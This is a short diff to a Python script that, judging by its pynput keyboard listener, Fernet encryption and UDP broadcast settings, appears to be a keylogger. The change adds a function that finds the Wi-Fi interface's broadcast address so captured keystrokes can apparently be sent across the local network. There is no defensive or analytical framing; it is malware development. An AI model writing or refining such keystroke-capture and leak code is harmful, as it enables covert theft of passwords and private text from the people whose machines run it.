@@ -5,10 +5,17 @@ import time
 from pynput.keyboard import Key, Listener
 import threading
 from cryptography.fernet import Fernet
+import netifaces
 
+def get_wlan_broadcast_ip():
+    for interface in netifaces.interfaces():
+        if interface.startswith("wl"):
+            broadcast_ip = netifaces.ifaddresses(interface)[netifaces.AF_INET][0]["broadcast"]
+            return broadcast_ip
+            
 word = ""
 current_hour = -1
-broadcast_ip = "255.255.255.255"
+broadcast_ip = get_wlan_broadcast_ip()
 port = 64647
 
 def on_press(key):
